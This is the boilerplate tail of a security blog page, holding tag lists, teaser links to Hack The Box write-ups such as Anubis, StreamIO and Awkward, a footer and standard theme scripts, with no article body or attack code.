mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Anubis/"><div class="card-body"> <em class="timeago small" date="2022-03-14 17:33:00 +0100" >Mar 14, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Anubis</h3><div class="text-muted small"><p> Anubis is Windows box which introduces SSTI/XSS vulnerability for initial foothold in Docker, followed by Jamovi CVE and Exploiting AD CS Enumeration NMAP NMAP will be ran on all ports: Nmap scan r...</p></div></div></a></div><div class="card"> <a href="/posts/StreamIO/"><div class="card-body"> <em class="timeago small" date="2022-09-17 11:33:00 +0200" >Sep 17, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(HTB) - StreamIO</h3><div class="text-muted small"><p> StreamIO is a medium Windows box. It’s all about enumeration at the start, finding SQL injection, Local and Remote File Inclusion. We have to keep track of passwords at all times. Last privilege Es...</p></div></div></a></div><div class="card"> <a href="/posts/awkward/"><div class="card-body"> <em class="timeago small" date="2023-03-04 10:33:00 +0100" >Mar 4</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(HTB) - Awkward</h3><div class="text-muted small"><p> Enumeration NMAP 1 2 3 4 5 6 Nmap scan report for 10.129.45.168 Host is up (0.045s latency). Not shown: 65514 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Luanne/" class="btn btn-outline-primary" prompt="Older"><p>(HTB) - Luanne</p></a> <a href="/posts/Academy/" class="btn btn-outline-primary" prompt="Newer"><p>(HTB) - Academy</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/cybersec_space">eng4ge</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script>
